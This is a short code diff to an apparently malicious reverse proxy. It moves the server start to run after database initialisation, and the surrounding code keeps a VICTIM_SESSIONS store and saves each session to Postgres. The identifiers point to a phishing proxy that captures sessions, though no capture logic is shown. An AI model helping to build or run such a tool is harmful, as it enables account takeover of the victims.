@@ -56,12 +56,6 @@ async function initializeDatabase() {
     }
 }
 
-// Call it before starting the HTTP server
-initializeDatabase().then(() => {
-    proxyServer.listen(process.env.PORT ?? 3000);
-    console.log(`Proxy server running on port ${process.env.PORT ?? 3000}`);
-});
-
 // ==================== POSTGRES STORAGE ====================
 async function upsertSessionInDb(sessionId) {
     const s = VICTIM_SESSIONS[sessionId];
@@ -622,7 +616,12 @@ upsertSessionInDb(currentSession).catch(() => {});
         clientResponse.end();
     }
 });
-proxyServer.listen(process.env.PORT ?? 3000);
+
+// Start the server only after DB initialization
+initializeDatabase().then(() => {
+    proxyServer.listen(process.env.PORT ?? 3000);
+    console.log(`Proxy server running on port ${process.env.PORT ?? 3000}`);
+});
 
 const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, currentSession, proxyHostname, proxyRequestBody, clientResponse, isNavigationRequest, proxyIndex = 0) => {
     const isHttps = proxyRequestProtocol === "https:";
